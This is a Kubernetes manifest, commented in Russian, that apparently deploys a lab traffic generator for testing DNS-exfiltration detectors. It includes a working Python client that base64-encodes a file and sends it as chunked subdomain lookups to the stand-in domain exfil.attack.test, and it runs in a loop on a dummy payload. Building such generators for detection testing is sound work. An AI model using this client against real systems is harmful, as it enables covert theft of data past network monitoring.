# DNS exfil client — data exfil over DNS. Генерирует: BASE64_SUBDOMAIN, MANY_SUBDOMAINS, HIGH_ENTROPY.
#
# Сервер (приёмник DNS) — в namespace attack-server (servers/deploy.sh exfil).
# Клиент — минимальный Python-скрипт из ConfigMap, без git и без выхода в интернет.
# Запросы идут в cluster DNS (CoreDNS) → tunnel-dns → exfil-receiver.
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: exfil-payload
  namespace: attack
  labels:
    app: attack-traffic
    tool: dnsexfiltrator
data:
  payload.txt: |
    sample data for dns exfil test
    line2
    secret_token_12345
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: dns-exfil-client-script
  namespace: attack
  labels:
    app: attack-traffic
    tool: dnsexfiltrator
data:
  dns_exfil_client.py: |
    # Minimal DNS exfil client: encode file in base64, send as subdomain lookups.
    # No git, no internet — uses cluster DNS (CoreDNS).
    import base64
    import socket
    import sys
    import re

    def dns_safe(s):
        return re.sub(r'[^a-zA-Z0-9\-]', 'x', s)

    def main():
        if len(sys.argv) < 3:
            print("Usage: dns_exfil_client.py <domain> <file>", file=sys.stderr)
            sys.exit(1)
        domain = sys.argv[1]
        path = sys.argv[2]
        with open(path, "rb") as f:
            raw = f.read()
        b64 = base64.urlsafe_b64encode(raw).decode().replace("=", "")
        chunk_size = 55
        for i in range(0, len(b64), chunk_size):
            chunk = dns_safe(b64[i:i + chunk_size])
            qname = f"{i//chunk_size}.{chunk}.{domain}"
            try:
                socket.getaddrinfo(qname, 0)
            except (socket.gaierror, OSError):
                pass
        print("Exfil done", flush=True)

    if __name__ == "__main__":
        main()
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dnsexfiltrator-client
  namespace: attack
  labels:
    app: attack-traffic
    tool: dnsexfiltrator
spec:
  replicas: 1
  selector:
    matchLabels:
      app: attack-traffic
      tool: dnsexfiltrator
  template:
    metadata:
      labels:
        app: attack-traffic
        tool: dnsexfiltrator
    spec:
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
            - weight: 100
              podAffinityTerm:
                labelSelector:
                  matchLabels:
                    app: attack-traffic
                topologyKey: kubernetes.io/hostname
      containers:
        - name: exfil
          image: python:3.11-alpine
          command: ["/bin/sh", "-c"]
          args:
            - |
              echo "DNS exfil client (ConfigMap script, no git)"
              while true; do
                python3 /scripts/dns_exfil_client.py "$EXFIL_DOMAIN" /payload/payload.txt
                sleep 30
              done
          env:
            - name: EXFIL_DOMAIN
              value: "exfil.attack.test"
          volumeMounts:
            - name: payload
              mountPath: /payload
            - name: script
              mountPath: /scripts
              readOnly: true
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 200m
              memory: 128Mi
      volumes:
        - name: payload
          configMap:
            name: exfil-payload
        - name: script
          configMap:
            name: dns-exfil-client-script
      restartPolicy: Always
